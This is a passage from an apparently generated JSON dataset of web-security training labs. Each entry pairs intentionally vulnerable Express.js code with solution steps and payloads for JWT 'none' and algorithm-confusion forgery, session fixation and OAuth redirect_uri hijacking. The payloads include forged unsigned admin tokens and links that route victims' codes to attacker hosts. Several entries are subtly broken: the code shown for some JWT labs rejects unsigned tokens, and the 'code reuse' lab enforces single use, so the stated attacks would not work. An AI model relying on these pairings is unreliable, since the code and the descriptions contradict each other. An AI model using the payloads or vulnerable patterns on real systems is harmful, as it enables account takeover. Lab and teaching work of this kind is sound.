  "Lab Description": "The application uses JWT tokens for session authentication but fails to verify the signing algorithm securely. The token is accepted even if the algorithm is changed to 'none'. The application embeds user roles inside JWTs and uses these to enforce access control. To solve: Access the /admin endpoint as an admin without valid credentials by manipulating the JWT header and payload.",

  "Difficulty Level": "Medium",

  "Solution Steps": [
    "Capture the login request using Burp Suite and extract the issued JWT from the Authorization header.",
    "Decode the JWT using jwt.io or Burp Decoder to inspect the header and payload contents.",
    "Replace the alg field in the JWT header with 'none' and modify the payload to set \"role\": \"admin\".",
    "Remove the signature part of the JWT and re-encode the token with only header and payload.",
    "Send a GET request to /admin with the modified JWT in the Authorization header to confirm access as admin."
  ],

  "Vulnerability name": "Authentication",

  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const SECRET = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, role: 'user' }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const auth = req.headers.authorization; const token = auth && auth.split(' ')[1]; try { const decoded = jwt.verify(token, SECRET, { ignoreExpiration: true }); if (decoded.role === 'admin') return res.send('Welcome Admin'); res.status(403).send('Access Denied'); } catch (err) { res.status(400).send('Invalid Token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Bypass running on http://localhost:${PORT}`));",

  "payloads": [
    "{\"alg\":\"none\",\"typ\":\"JWT\"}",
    "{\"username\":\"carlos\",\"role\":\"admin\"}",
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9."
  ]
},
{
  "Lab scenario": "Session Fixation via Predictable Session ID in Cookie",

  "Lab Description": "The application assigns static session tokens based on usernames, which are reused on login and not regenerated after successful authentication. This allows an attacker to force a victim to use a known session ID. To solve: Fixate Carlos's session ID and gain access to his authenticated account without knowing his password.",

  "Difficulty Level": "Hard",

  "Solution Steps": [
    "Using OWASP ZAP or Burp Suite, observe that session IDs are set as user:<username> in cookies.",
    "Log in as your own account and confirm that the same session ID is reused on every login.",
    "Manually craft a session cookie with value session=user:carlos and deliver it to the victim using an XSS/CSRF simulation.",
    "Wait for Carlos to log in and claim the known session ID from your browser.",
    "Access /dashboard with the fixed session cookie and verify Carlos's account is exposed."
  ],

  "Vulnerability name": "Authentication",

  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'carpass' }, { username: 'guest', password: 'guestpass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { res.cookie('session', `user:${username}`); res.redirect('/dashboard'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/dashboard', (req, res) => { const session = req.cookies.session; if (session === 'user:carlos') return res.send('Carlos dashboard content'); if (session) return res.send('User dashboard content'); res.status(401).send('No session'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab on http://localhost:${PORT}`));",

  "payloads": [
    "Cookie: session=user:carlos",
    "Force session ID via XSS or CSRF iframe injection",
    "Manually inject session into browser before login"
  ]
},
{
  "Lab scenario": "OAuth Misconfiguration in Redirect URI Validation",

  "Lab Description": "The application uses OAuth for login via a third-party provider but fails to enforce strict validation of the redirect URI. This allows attackers to intercept authorization codes by manipulating the redirect_uri parameter. To solve: Capture Carlos's authorization code and exchange it for an access token to access his profile.",

  "Difficulty Level": "Hard",

  "Solution Steps": [
    "Initiate an OAuth login flow and intercept the redirect to your registered redirect_uri using Burp Suite.",
    "Modify the redirect_uri parameter to an attacker-controlled domain while preserving domain prefix similarity.",
    "Send the OAuth link to the victim to trick them into authenticating and leaking the authorization code.",
    "Capture the authorization code in the attacker-controlled server log.",
    "Exchange the code with the /oauth/token endpoint and use the access_token to fetch Carlos's profile via /me endpoint."
  ],

  "Vulnerability name": "Authentication",

  "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.urlencoded({ extended: true })); const authCodes = {}; const accessTokens = {}; const clients = [{ clientId: 'trusted-client', redirectUri: 'https://trusted.example.com/callback' }]; app.get('/oauth/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; const validClient = clients.find(c => c.clientId === client_id); if (!validClient) return res.status(400).send('Unknown client'); authCodes['carlos'] = 'code123'; res.redirect(`${redirect_uri}?code=code123&state=${state}`); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (code === 'code123') return res.json({ access_token: 'token-for-carlos' }); res.status(403).send('Invalid code'); }); app.get('/me', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-for-carlos') return res.send('Carlos profile data'); res.status(403).send('Access Denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Lab running on http://localhost:${PORT}`));",

  "payloads": [
    "redirect_uri=https://attacker.example.com/callback",
    "GET /oauth/authorize?client_id=trusted-client&redirect_uri=https://attacker.example.com/callback&state=xyz",
    "POST /oauth/token with code=code123",
    "Authorization: Bearer token-for-carlos"
  ]
},
{
  "Lab scenario": "JWT algorithm confusion in access control middleware",
  "Lab Description": "This lab contains a JWT implementation vulnerable to algorithm confusion. The application uses the 'alg' field from the token header without enforcing a fixed algorithm, allowing a switch from RS256 to HS256 with the public key as HMAC secret. To solve: Forge a JWT token to impersonate the admin user and access /admin/dashboard.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1.Using Burp Suite, intercept a login request and extract the JWT issued after successful login.",
    "2.Decode the JWT using jwt.io or jwt_tool and observe the 'alg' field set to RS256.",
    "3.Fetch the public key from /.well-known/jwks.json endpoint (discovered via OWASP ZAP or proxy history).",
    "4.Use jwt_tool or Postman to forge a new token with 'alg' changed to HS256 and use the public key as the HMAC key.",
    "5.Modify the payload to { \"username\": \"admin\", \"role\": \"admin\" }, sign and encode the token.",
    "6.Send the forged token to /admin/dashboard in the Authorization header and verify admin access is granted."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); app.use(express.json()); const pubKey = fs.readFileSync('./public.pem'); const users = { 'carlos': 'userpass', 'admin': 'supersecret' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const token = jwt.sign({ username: username, role: username === 'admin' ? 'admin' : 'user' }, fs.readFileSync('./private.pem'), { algorithm: 'RS256' }); return res.json({ token }); } res.status(403).send('Invalid login'); }); app.get('/admin/dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, pubKey); if (decoded.role === 'admin') return res.send('Welcome to the admin dashboard'); return res.status(403).send('Access denied'); } catch (e) { return res.status(401).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT Confusion Lab running'));",
  "payloads": [
    "Header: { \"alg\": \"HS256\", \"typ\": \"JWT\" }",
    "Payload: { \"username\": \"admin\", \"role\": \"admin\" }",
    "Sign using public key as HMAC secret",
    "Send forged token in Authorization: Bearer header"
  ]
},
{
  "Lab scenario": "Session fixation via login redirection token",
  "Lab Description": "This lab implements a redirection-based login flow where a session token is pre-assigned and reused across accounts. The session fixation vulnerability arises due to the application honoring the token provided in the URL even after successful login. To solve: Fix a session for Carlos and access /my-account as him.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1.With Burp Suite, visit /login?token=randomvalue before authenticating.",
    "2.Capture the Set-Cookie response and observe the token is accepted and stored.",
    "3.Log in with your own credentials and verify the session remains the same from the earlier token.",
    "4.Log out and craft a link: /login?token=fixedtoken and send it to Carlos (simulate using replay).",
    "5.After Carlos logs in, reuse the fixedtoken cookie to access /my-account.",
    "6.Verify that Carlos's account data is accessible, proving session fixation."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); const users = { 'carlos': 'superpass', 'attacker': 'attackerpass' }; const sessions = {}; app.get('/login', (req, res) => { const token = req.query.token || Math.random().toString(36).slice(2); res.cookie('session', token); sessions[token] = null; res.send(`<form method='POST' action='/login'><input name='username'/><input name='password'/><button>Login</button></form>`); }); app.post('/login', (req, res) => { const { username, password } = req.body; const session = req.cookies.session; if (users[username] === password) { sessions[session] = username; return res.redirect('/my-account'); } res.send('Invalid login'); }); app.get('/my-account', (req, res) => { const session = req.cookies.session; const user = sessions[session]; if (user) return res.send(`Account page of ${user}`); res.send('Not logged in'); }); app.listen(4001, () => console.log('Session Fixation Lab running'));",
  "payloads": [
    "/login?token=fixedsessiontoken",
    "Set-Cookie: session=fixedsessiontoken",
    "Reuse session cookie after victim login",
    "GET /my-account with stolen fixed session"
  ]
},
{
  "Lab scenario": "OAuth authorization code leakage via Referer header",
  "Lab Description": "This lab is vulnerable due to improper handling of OAuth 2.0 authorization codes which can leak via the Referer header to third-party domains. The app does not validate the 'redirect_uri' domain properly, allowing attackers to steal codes. To solve: Leak the victim's code to your server and redeem it to access their account.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1.Use OWASP ZAP to analyze the OAuth flow. Observe the authorization code is passed via query parameters to the 'redirect_uri'.",
    "2.Register an attacker redirect_uri like https://attacker.site/callback that logs Referer headers.",
    "3.Trick Carlos into clicking a crafted OAuth login link with your attacker site as the redirect_uri.",
    "4.Receive the authorization code via your server's Referer logs.",
    "5.Use Postman to redeem the stolen code at /oauth/token and obtain an access token.",
    "6.Use the token to call /api/me and confirm account takeover."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const crypto = require('crypto'); const qs = require('querystring'); app.use(express.urlencoded({ extended: true })); const codes = {}; const tokens = {}; const users = { 'carlos': { id: 1, name: 'Carlos' } }; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; const code = crypto.randomBytes(4).toString('hex'); codes[code] = 'carlos'; const location = `${redirect_uri}?code=${code}&state=${state}`; res.redirect(location); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; const user = codes[code]; if (!user) return res.status(400).send('Invalid code'); const token = crypto.randomBytes(8).toString('hex'); tokens[token] = user; res.json({ access_token: token }); }); app.get('/api/me', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const user = tokens[token]; if (!user) return res.status(401).send('Unauthorized'); res.send(`Welcome ${users[user].name}`); }); app.listen(4002, () => console.log('OAuth Code Leak Lab running'));",
  "payloads": [
    "https://auth.lab/authorize?client_id=abc&redirect_uri=https://attacker.site/callback&state=xyz",
    "Capture code=abcd123 from Referer header on attacker.site",
    "POST /oauth/token with code=abcd123",
    "GET /api/me with Authorization: Bearer <token>"
  ]
},
{
  "Lab scenario": "JWT none algorithm bypass in Authorization header",
  "Lab Description": "The application uses JWTs to manage user sessions but fails to validate the signature if the algorithm is set to 'none'. The JWT token is sent via the Authorization header in a Bearer scheme. To solve: Forge a valid admin JWT using the 'none' algorithm and access the admin dashboard.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Burp Suite to intercept a request after logging in with a normal user account. Locate the Authorization header containing the Bearer JWT.",
    "Send the JWT to jwt.io or decode it locally. Observe the header: {\"alg\": \"HS256\", \"typ\": \"JWT\"}.",
    "Change the alg value to 'none' and remove the signature part of the token.",
    "Modify the payload to {\"username\": \"admin\", \"role\": \"admin\"} and re-encode the JWT without a signature.",
    "Replace the Authorization header in a request to /admin-panel with the forged JWT and send the request. Confirm admin access."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = { alice: 'user', admin: 'admin' }; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, role: users[username] }, 'supersecret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin-panel', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = jwt.decode(token); if (payload.role === 'admin') return res.send('Admin panel access granted'); } try { const verified = jwt.verify(token, 'supersecret'); if (verified.role === 'admin') return res.send('Admin panel access granted'); } catch (err) { return res.status(403).send('Access denied'); } res.status(403).send('Access denied'); }); app.listen(3000);",
  "payloads": [
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
    "Authorization: Bearer <forged_none_jwt_token>"
  ]
},
{
  "Lab scenario": "Session fixation via cookie injection during login",
  "Lab Description": "The login flow accepts any session cookie provided by the user and binds it to the authenticated session. There is no session regeneration after login, allowing session fixation attacks. To solve: Fixate a session for the victim and hijack their session after they log in.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Postman to create a crafted session ID like session=attacker123 and inject it in the login request headers.",
    "Send the crafted login request using your own credentials and confirm the session is tied to attacker123.",
    "Craft a phishing link pointing to the victim's login page, setting the session cookie as attacker123 using JavaScript or Burp Collaborator.",
    "Wait for the victim to log in using the fixated session ID (attacker123).",
    "Reuse attacker123 session ID to access /my-account and confirm access to the victim's session."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(express.urlencoded({ extended: true })); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'hunter2' }]; const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); let sid = req.cookies.session || Math.random().toString(36).substring(2); sessions[sid] = username; res.cookie('session', sid); res.send('Login successful'); }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user) res.send('My Account: ' + user); else res.status(403).send('Forbidden'); }); app.listen(4000);",
  "payloads": [
    "Cookie: session=attacker123",
    "POST /login with attacker session injected",
    "Access /my-account with session=attacker123"
  ]
},
{
  "Lab scenario": "OAuth authorization code reuse flaw",
  "Lab Description": "The application integrates with an OAuth provider for login but fails to enforce single-use authorization codes. This allows an attacker to reuse a previously intercepted OAuth code to hijack a session. To solve: Reuse an intercepted authorization code to log in as the victim.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to intercept an OAuth login request with a code parameter (e.g., /callback?code=123abc).",
    "Send the intercepted request to Burp Repeater and replay it to observe a valid session is still granted.",
    "Confirm the authorization server does not invalidate the code after the first use.",
    "Craft a phishing email or MITM attack to intercept a code from the victim's OAuth login flow.",
    "Replay the victim's intercepted code in /callback?code=xyz456 and gain access to their session."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const usedCodes = new Set(); const authCodes = { 'xyz456': 'carlos', '123abc': 'alice' }; const sessions = {}; app.get('/callback', (req, res) => { const { code } = req.query; if (usedCodes.has(code)) return res.status(403).send('Code already used'); if (authCodes[code]) { usedCodes.add(code); const sid = Math.random().toString(36).slice(2); sessions[sid] = authCodes[code]; res.cookie('session', sid); return res.send('Logged in as ' + authCodes[code]); } res.status(401).send('Invalid code'); }); app.get('/profile', (req, res) => { const user = sessions[req.cookies.session]; if (user) res.send('Profile: ' + user); else res.status(403).send('Not logged in'); }); app.listen(3000);",
  "payloads": [
    "/callback?code=123abc",
    "/callback?code=xyz456",
    "Intercepted and replayed OAuth authorization codes"
  ]
},
{
  "Lab scenario": "JWT tampering in Authorization header",
  "Lab Description": "This lab implements JWT-based authentication for accessing sensitive resources. The application verifies JWT tokens using a static secret but does not enforce the signing algorithm properly. To solve the lab, forge a valid JWT and access the admin panel without valid credentials.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Intercept a valid JWT token using Burp Suite by logging in as a regular user and capturing the Authorization header.",
    "2. Analyze the JWT structure at jwt.io and note the algorithm used in the header is 'HS256'.",
    "3. Modify the header to use 'none' and remove the signature part.",
    "4. In Burp Repeater, craft a tampered JWT with the payload {\"username\":\"admin\"}, set the header to {\"alg\":\"none\"}, and remove the signature.",
    "5. Replace the original token in the Authorization header with the forged token and send the request to /admin.",
    "6. Observe if the application grants access to the admin panel and validate lab completion."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'hardcodedsecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, secret); res.json({ token }); }); app.get('/admin', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, secret); if (decoded.username === 'admin') res.send('Admin access granted'); else res.status(403).send('Forbidden'); } catch (err) { res.status(401).send('Invalid token'); } }); app.listen(4000);",
  "payloads": [
    "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
    "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.DUMMY_SIGNATURE"
  ]
},
{
  "Lab scenario": "Session fixation via predictable session ID in SOAP API",
  "Lab Description": "The SOAP-based login service allows an attacker to define the session ID prior to authentication, leading to session fixation. The application does not regenerate session IDs upon login. To solve the lab, fix a session for the victim and hijack their account.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. In Postman, send a crafted SOAP request to /soap-login including a sessionID element with a predictable value such as 'fixme1234'.",
    "2. Share this sessionID link with the victim to make them authenticate using the fixed session.",
    "3. After victim login, reuse the same sessionID in your cookie.",
    "4. Send a request to /user-panel with the fixed session ID in the cookie header.",
    "5. If session fixation worked, observe access to victim’s session data and confirm lab completion."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); const xmlparser = require('express-xml-bodyparser'); const app = express(); app.use(xmlparser()); app.use(cookieParser()); const sessions = {}; app.post('/soap-login', (req, res) => { const body = req.body['soapenv:Envelope']['soapenv:Body'][0]['ns1:LoginRequest'][0]; const username = body['username'][0]; const password = body['password'][0]; const sessionId = body['sessionID'][0]; if (username === 'carlos' && password === 'supersecure') { sessions[sessionId] = username; res.cookie('SID', sessionId); res.send('<response>Logged in</response>'); } else res.send('<response>Invalid</response>'); }); app.get('/user-panel', (req, res) => { const sid = req.cookies['SID']; if (sessions[sid]) res.send(`Welcome ${sessions[sid]}`); else res.status(403).send('Unauthorized'); }); app.listen(4001);",
  "payloads": [
    "<soapenv:Envelope xmlns:soapenv='http://schemas.xmlsoap.org/soap/envelope/'><soapenv:Body><ns1:LoginRequest xmlns:ns1='http://example.com/soap'><username>carlos</username><password>supersecure</password><sessionID>fixme1234</sessionID></ns1:LoginRequest></soapenv:Body></soapenv:Envelope>",
    "Cookie: SID=fixme1234"
  ]
},
{
  "Lab scenario": "OAuth misconfiguration leaking access token in redirect",
  "Lab Description": "The application integrates OAuth login using a third-party provider but leaks the access token in the URL fragment after redirection. This token can be captured and reused. To solve the lab, obtain Carlos's access token from the redirect URL and use it to access his private data endpoint.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Initiate OAuth login as yourself and intercept the final redirect using Burp Suite.",
    "2. Observe the access_token is leaked in the fragment portion of the URL (after the #).",
    "3. Reflect on how this can be captured via open redirect or stored XSS.",
    "4. Trick Carlos into visiting a malicious link that captures his access token via JavaScript.",
    "5. Use Carlos's token in a GET /private-data?access_token=<token> request to retrieve his personal data.",
    "6. Confirm access to his private endpoint and solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const accessTokens = { 'carlos-token': 'carlos' }; app.get('/oauth/callback', (req, res) => { const token = req.query.token; res.redirect(`/home#access_token=${token}`); }); app.get('/private-data', (req, res) => { const token = req.query.access_token; if (accessTokens[token] === 'carlos') res.send('Sensitive data for carlos'); else res.status(403).send('Access denied'); }); app.listen(4002);",
  "payloads": [
    "https://malicious.com#access_token=carlos-token",
    "GET /private-data?access_token=carlos-token"
  ]
},
{
  "Lab scenario": "Session fixation via insecure session reuse in GraphQL login flow",
  "Lab Description": "The application's GraphQL login mutation does not issue new session tokens after authentication. Instead, it reuses any existing session token from unauthenticated users. This leads to a session fixation vulnerability. The application accepts session cookies before login and continues using them post-authentication without rotation. To solve: Fixate Carlos's session ID, then authenticate using his credentials and hijack his session.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Using OWASP ZAP or Burp Suite, intercept the POST /graphql request containing the login mutation and note the session cookie.",
    "2. Craft a request to POST /graphql that creates a session with a known cookie value (e.g., fixated-sessid) using a low-privilege account or anonymous user.",
    "3. Send this request repeatedly until the application issues a session using your specified fixated cookie.",
    "4. Trick the victim (Carlos) into logging in while his browser holds the fixated session cookie (e.g., via social engineering or image URL injection).",
    "5. Once Carlos authenticates, reuse the fixated session ID from your browser to access /my-account with elevated privileges."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); const app = express(); app.use(bodyParser.json()); app.use(cookieParser()); const users = { 'carlos': 'supersecret123', 'guest': 'guestpass' }; const sessions = {}; app.post('/graphql', (req, res) => { const query = req.body.query; if (query.includes('mutation Login')) { const { username, password } = JSON.parse(query.split('input:')[1].split(')')[0]); if (users[username] === password) { const sessId = req.cookies['sess'] || Math.random().toString(36).substring(2); sessions[sessId] = username; res.cookie('sess', sessId); return res.json({ data: { login: true } }); } else { return res.json({ errors: ['Invalid credentials'] }); } } res.json({ data: {} }); }); app.get('/my-account', (req, res) => { const sess = req.cookies['sess']; if (sessions[sess]) return res.send('Account: ' + sessions[sess]); res.status(403).send('Forbidden'); }); app.listen(3000);",
  "payloads": [
    "POST /graphql with cookie: sess=fixatedid",
    "mutation Login { login(input: { username: \"carlos\", password: \"supersecret123\" }) { success } }"
  ]
},
{
  "Lab scenario": "JWT 'none' algorithm manipulation in REST API authentication",
  "Lab Description": "The application uses stateless JWTs for authentication and accepts unsigned JWTs due to incorrect validation logic. By manipulating the 'alg' header of the JWT to 'none', an attacker can forge valid session tokens. The application fails to reject tokens that lack valid signatures. To solve: Forge an unsigned JWT that grants admin access and retrieve sensitive data from the /admin endpoint.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Log in normally via Postman and capture a valid JWT from the Authorization: Bearer header.",
    "2. Decode the JWT at jwt.io and note the header and payload.",
    "3. Modify the JWT header to: {\"alg\":\"none\"}, and change the payload to include \"role\":\"admin\".",
    "4. Remove the signature portion completely.",
    "5. Send a new request to GET /admin with Authorization: Bearer <forged_token>. If accepted, access will be granted."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const SECRET = 'secretkey123'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'admin' && password === 'adminpass') { const token = jwt.sign({ username, role: 'admin' }, SECRET); return res.json({ token }); } res.status(401).json({ error: 'Invalid login' }); }); app.get('/admin', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; try { const payload = jwt.verify(token, SECRET, { algorithms: ['HS256', 'none'] }); if (payload.role === 'admin') return res.send('Sensitive admin data'); res.status(403).send('Insufficient rights'); } catch (e) { res.status(400).send('Invalid token'); } }); app.listen(4000);",
  "payloads": [
    "Header: {\"alg\":\"none\"}",
    "Payload: {\"username\":\"admin\",\"role\":\"admin\"}",
    "JWT (no signature): <base64(header)>.<base64(payload)>."
  ]
},
{
  "Lab scenario": "OAuth implicit flow misconfiguration leading to token theft via redirect URI manipulation",
  "Lab Description": "The application integrates with a third-party OAuth provider but fails to validate redirect URIs properly in the implicit flow. An attacker can craft a malicious redirect URI pointing to their controlled domain, capturing the access token directly from the URL fragment. To solve: Capture Carlos's OAuth access token and use it to fetch his protected profile from /oauth/profile.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Analyze the OAuth login request using Burp Suite and note the response_type=token parameter indicating implicit flow.",
    "2. Modify the redirect_uri parameter to point to a controlled domain (e.g., https://attacker.com/callback) and trick Carlos into visiting the modified authorization URL.",
    "3. Capture the access token from the fragment (#access_token=...) once Carlos logs in.",
    "4. Use Postman to send GET /oauth/profile with Authorization: Bearer <stolen_token>.",
    "5. Confirm access to Carlos's data to solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const tokens = { 'carlos': 'abc123xyz456' }; app.get('/auth', (req, res) => { const { redirect_uri, response_type, username } = req.query; if (response_type === 'token') { const token = tokens[username]; const redirect = `${redirect_uri}#access_token=${token}`; return res.redirect(redirect); } res.status(400).send('Invalid request'); }); app.get('/oauth/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'abc123xyz456') return res.send('Carlos OAuth profile'); res.status(403).send('Invalid token'); }); app.listen(5000);",
  "payloads": [
    "GET /auth?response_type=token&redirect_uri=https://attacker.com/callback&username=carlos",
    "Extract #access_token from redirected URL",
    "GET /oauth/profile with Authorization: Bearer abc123xyz456"
  ]
},
{
  "Lab scenario": "Session Fixation in REST Login Flow",
  "Lab Description": "This lab simulates a flawed session management implementation where a session ID can be pre-assigned and accepted post-authentication. The application fails to invalidate existing session cookies on login. To solve: Hijack Carlos's session after successful login by forcing him to use your pre-assigned session ID.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Burp Suite Proxy to capture your login request and observe the `Set-Cookie: sid=...` header.",
    "Send a crafted link to Carlos with the fixed session ID in the `Cookie` header using a phishing payload.",
    "Log in using your own credentials to ensure session ID does not change.",
    "Monitor for Carlos's session reuse using the pre-assigned session ID.",
    "Access `/my-account` using the hijacked session token to confirm access."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'crimsonpass' }]; const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { let sid = req.cookies.sid || 'sess' + Math.floor(Math.random() * 10000); sessions[sid] = username; res.cookie('sid', sid); res.send('Logged in'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; const user = sessions[sid]; if (user) res.send(`Welcome ${user}`); else res.status(403).send('Access denied'); }); app.listen(3001);",
  "payloads": [
    "Cookie: sid=sess6666",
    "POST /login with pre-set sid cookie",
    "Access victim's /my-account with fixed sid"
  ]
},
{
  "Lab scenario": "JWT None Algorithm in Authorization Header",
  "Lab Description": "The application uses JWT tokens to authenticate GraphQL API requests, but fails to properly enforce the signing algorithm. The server accepts tokens signed with `alg: none`, allowing unauthorized access. To solve: Forge a token for Carlos and access his GraphQL user profile.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Postman to capture an authenticated GraphQL request and extract the JWT from the Authorization header.",
    "Decode the JWT using jwt.io and modify the payload to impersonate 'carlos', setting `alg` to `none` in the header.",
    "Remove the signature part and craft a new Authorization header using the modified JWT.",
    "Send a POST request to `/graphql` with a valid query (e.g., `{ me { username, email } }`).",
    "Observe response showing Carlos's data to confirm the exploit."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = { carlos: { email: 'carlos@example.com', role: 'user' } }; app.post('/graphql', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('No token'); const token = auth.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); req.user = payload; } else { jwt.verify(token, 'supersecret'); } } catch (e) { return res.status(401).send('Token error'); } res.json({ data: { me: users[req.user.username] } }); }); app.listen(3002);",
  "payloads": [
    "Authorization: Bearer <base64({alg: 'none'})>.<base64({username: 'carlos'})>.",
    "POST /graphql with { me { username } }",
    "Modified JWT token without signature"
  ]
},
{
  "Lab scenario": "OAuth Code Interception in Redirect URI",
  "Lab Description": "This lab features an OAuth authorization implementation vulnerable to redirect URI manipulation. The app accepts unvalidated redirect URIs and sends valid authorization codes to attacker-controlled endpoints. To solve: Intercept Carlos’s authorization code and exchange it for an access token to access his profile.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "In Burp Suite, initiate OAuth login and intercept the `/authorize?client_id=...` request.",
    "Modify the `redirect_uri` to point to your server (e.g., https://attacker.com/callback).",
    "Send the malicious link to Carlos to trigger OAuth login.",
    "Capture the `code` sent to your malicious callback endpoint.",
    "Manually exchange the code using Postman with a POST to `/oauth/token` to retrieve Carlos’s token.",
    "Use the token to send an authenticated GET request to `/profile` endpoint and view Carlos’s data."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const tokens = {}; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, response_type } = req.query; if (response_type === 'code') { const code = 'authcode123'; tokens[code] = 'carlos'; res.redirect(`${redirect_uri}?code=${code}`); } else { res.status(400).send('Invalid response type'); } }); app.post('/token', (req, res) => { const { code } = req.body; const user = tokens[code]; if (user) { res.json({ access_token: `token-${user}`, token_type: 'bearer' }); } else { res.status(400).send('Invalid code'); } }); app.get('/profile', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer token-carlos') res.send('Carlos Profile Data'); else res.status(403).send('Unauthorized'); }); app.listen(3003);",
  "payloads": [
